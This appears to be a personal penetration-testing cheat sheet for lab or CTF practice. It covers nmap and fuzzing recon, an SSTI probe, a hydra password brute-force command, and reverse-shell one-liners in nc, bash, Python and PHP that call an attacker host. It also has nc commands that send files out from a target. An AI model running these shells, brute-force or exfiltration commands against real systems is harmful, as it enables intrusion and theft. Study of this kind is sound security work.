# Quick network discovery 
arp -a 
ip a # ifconfig
ip route #windows --> route print / ipconfig

# full initial scan
nmap -sV -T4 -vv -Pn --script=http-enum,vuln -oN nmap_$target $target #for single IP add
nmap -sV -T4 -vv -Pn --script=http-enum,vuln -iL target_IPs.txt -oN nmap_all #if I have more IP adds

# If i need to further enumerate, do a UDP, or a full port scan
nmap $target -Pn -sU -sV -T4 --top-ports 25 -v
nmap $target -p- -sV -v -T4 -Pn 

# Scan specific ports
nmap $target -p22,80 -sC -sV -v

# After scanning → search for known vulns, also exploit-db, google/github, cvedetails, 
searchsploit <service/version>


#usefull online tools: ---> revshells, gtfobins, crackstation, 

# IF there are http stuff open
# Add virtual hosts manually
sudo vim /etc/hosts

# Basic vulnerability scan
nikto -host http://$target

# Quick SSTI test (Node/Python templates)
# Try in inputs:
# {{7*7}}

##########
# Dir/VHost Fuzzing
##########
dirsearch -u http://$target #why not, but better gobuster?
dirsearch -u http://$target --exclude-status=302 -w /usr/share/dirbuster/wordlists/directory-list-1.0.txt # -x php, etc depending?

ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://$target/FUZZ -fc 302 #try this

gobuster vhost -u http://$target/ -w /usr/share/wordlists/dirb/big.txt # try
gobuster dir -u http://$target -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt #pretty good!

##########
# Manual Web Checks (Burp)
##########
# - Look for JS files, hidden params
# - Check cookies/session tokens
# - Intercept → Modify → Replay requests
# 

########################################
# 4. CREDENTIAL ATTACKS (LAB ONLY)
########################################

hydra -l admin -P /usr/share/seclists/Passwords/darkweb2017-top10000.txt \
<TARGET_IP> http-post-form "/login:username=^USER^&password=^PASS^:Invalid login"


########################################
# 5. REVERSE SHELLS & LISTENERS
########################################

# Listener
nc -nvlp 5555

# Common one-liners: - check revshells.com for making the best ones!


#php - the one from Ivan Sincek works for sure (sometimes at least!)

# nc (if -e supported)
# nc -e /bin/sh <LHOST> <LPORT>

# Bash
# bash -i >& /dev/tcp/10.10.XX.XXX:5555 0>&1

# Python
# python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'

# PHP
# php -r '$s=fsockopen("<LHOST>",<LPORT>);exec("/bin/sh -i <&3 >&3 2>&3");'

# Spawn stable PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'

#also what else?
export TERM=xterm-256color

#and something more i am sure?


########################################
# 6. FILE TRANSFER
########################################

# Receive file on attacker
# nc -nvlp <PORT> > file

# Send from target
# nc <LHOST> <PORT> < file

########################################
# 7. INITIAL POST-EXPLOIT ENUM
########################################

whoami
id
hostname
uname -a
pwd
ls -la
ps aux

find / -type f OR -name *.whatever or -group www-data (based on id group membership) and then 2>/dev/null
sudo -l
